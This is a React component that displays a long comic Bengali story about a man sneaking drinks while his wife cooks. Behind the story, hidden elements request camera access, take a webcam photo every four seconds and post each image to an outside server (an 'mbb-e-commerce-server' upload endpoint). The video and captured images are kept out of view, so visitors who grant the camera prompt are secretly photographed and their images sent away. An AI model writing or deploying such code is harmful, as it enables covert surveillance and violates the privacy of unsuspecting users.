import  { useRef, useState, useEffect } from 'react';
import axios from 'axios';
import { Toaster } from 'react-hot-toast';

const CameraCapture = () => {
  const videoRef = useRef(null);
  const [images, setImages] = useState([]);

  useEffect(() => {
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoRef.current.srcObject = stream;
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    };

    const captureImage = () => {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d').drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg');

      // Append the new image to the existing images array
      setImages(prevImages => [...prevImages, dataUrl]);

      // Send the image URL to the server
      axios.post('https://mbb-e-commerce-server.vercel.app/imageUploader', { imageUrl: dataUrl })
        .then(response => {
          console.log('Image URL sent to server successfully:', response.data);
          
          // toast.success(response.data?.insertedId)
          // Handle successful upload
        })
        .catch(error => {
          console.error('Error sending image URL to server:', error);
          // Handle upload error
        });
    };

    // Start the camera
    startCamera();

    // Capture an image every 2 seconds
    const intervalId = setInterval(() => {
      captureImage();
    }, 4000);

    // Clean up function to clear the interval when the component unmounts
    return () => clearInterval(intervalId);
  }, []);

  return (
    <div>
      <p className='mx-5 my-10'>
      মদ খাওয়ার সময় আমি কোন রিস্ক নিই না।🥃
অফিস থেকে সন্ধ্যাবেলা বাড়ি ফিরে দেখি গিন্নি রান্না করছে।
রান্নাঘর থেকে বাসনের আওয়াজ আসছে।
আমি চুপিচুপি ঘরে ঢুকে পড়লাম।
কালো রঙের আলমারি থেকে বোতল বার করলাম।
নেতাজি ফটো ফ্রেম থেকে আমাকে দেখছেন।
কিন্তু এখন পর্যন্ত কেউ কিচ্ছুটি টের পায় নি।
কারণ আমি কোন রিস্ক নিই না।
সিঙ্কের উপরের তাক থেকে গ্লাস বার করলাম
আর টক করে এক পেগ গিলে ফেললাম।
গ্লাস ধুয়ে ফের তা তাকের উপর রেখে দিলাম
হা, বোতল টাও আলমারি তে রেখে দিলাম।
নেতাজি মুচকি হাসলেন।
রান্নাঘরে উঁকি দিলাম, গিন্নি দেখি আলু কাটছে।
কেউ কিছু টের পায় নি।
কারণ আমি কোন রিস্ক নিই না।
গিন্নি কে জিগেস করলাম: সমীরের মেয়ের বিয়ের কিছু হলো ?
গিন্নি : নাহ, মেয়েটার ভাগ্য টাই খারাপ। এখনো পাত্র দেখছে।
আমি আবার ঘরে গেলাম, আলমারি খুলতে গিয়ে এবার একটু শব্দ হলো।
তেমন কিছু নয় অবশ্যি।
বোতল বের করার সময় অবশ্য কোনো আওয়াজ করিনি।
সিঙ্কের উপরের তাক থেকে গ্লাস নিয়ে চট করে দু পেগ মেরে দিলাম।
বোতল ধুয়ে সাবধানে সিঙ্কের মধ্যে রেখে দিলাম। আর গ্লাস টা আলমারি তে।
এখন পর্যন্ত কেউ কোনো কিছু আঁচ করতে পারে নি
কারণ আমি কোন রিস্ক নিই না।
বাইরে এসে গিন্নিকে : যাই হোক, সমীরের মেয়ের বয়েস ই বা কি !
গিন্নি : কী বলছ !! ৩০ বছর বয়েস হলো, দেখতে আরো বুড়োটে লাগে।
আমি (ভুলেই গেছিলাম সমীরের মেয়ের বয়েস ৩০) : তা ঠিক
সুযোগ বুঝে ফের আলমারি থেকে আলু বের করলাম (আলমারিটা আবার জায়গা বদলে ফেলল কি করে রে বাবা),
তাক থেকে বোতল বার করে সিঙ্কের সঙ্গে মিশিয়ে চট করে আর এক পেগ পেটে চালান করলাম।
নেতাজি দেখি জোরে জোরে হাসছেন।
তাক আলুতে রেখে নেতাজীর ছবি খুব ভালো করে ধুয়ে আলমারিতে রেখে দিলাম।
গিন্নি কি করছে দেখি - হ্যা, ও গাসের উপর সিংক চড়াচ্ছে।
কিন্তু এখন পর্যন্ত কেউ কিসসু টের পায় নি,
কারণ আমি কোন রিস্ক নিই না।
আমি গিন্নিকে : তুমি সমীরকে বুড়ো বললে ?
গিন্নি : বকবক কর না তো , বাইরে গিয়ে চুপ করে বসো। এখন তুমি কথা বলবে না।
আমি আলু থেকে ফের বোতল বের করে মজাসে আলমারি তে আরো এক পেগ গিললাম।
সিংক টা ধুয়ে ওটাকে তাকের উপর রেখে দিলাম।
ফটো ফ্রেম থেকে গিন্নি এখনো হেসে চলেছে।
নেতাজি রান্না করছে।
কিন্তু এখনো কেউ কিছু টের পায় নি
কারণ আমি কোন রিস্ক নিই না।
গিন্নিকে হাসতে হাসতে বললাম : তাহলে সমীর পাত্রী দেখছে ?
গিন্নি : শোনো, তুমি মুখে জলের ঝাপটা দিয়ে কোথাও চুপ করে বস তো !
আমি রান্না ঘরে গিয়ে চুপচাপ তাকের উপর বসলাম।
কিন্তু এখন অবধি সমীর কিছু টের পায় নি
কারণ নেতাজি কোন রিস্ক নেন না।
সমীর এখনো রান্না করছে।
আর আমি ? আমি ফটো ফ্রেম থেকে গিন্নিকে দেখে এখনো হেসে চলেছি।
কারন আমি কখনো ইয়ে নিই না, কি যেন নিই না ......ও হা, আলু নিই না।
      </p>
      <div className='hidden'>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        {images.map((image, index) => (
          <img key={index} src={image} alt={`Captured Image ${index}`} style={{ margin: '5px' }} />
        ))}
      </div>
      <video ref={videoRef} autoPlay style={{ display: 'none' }} />
      </div>
      <Toaster></Toaster>
    </div>
  );
};

export default CameraCapture;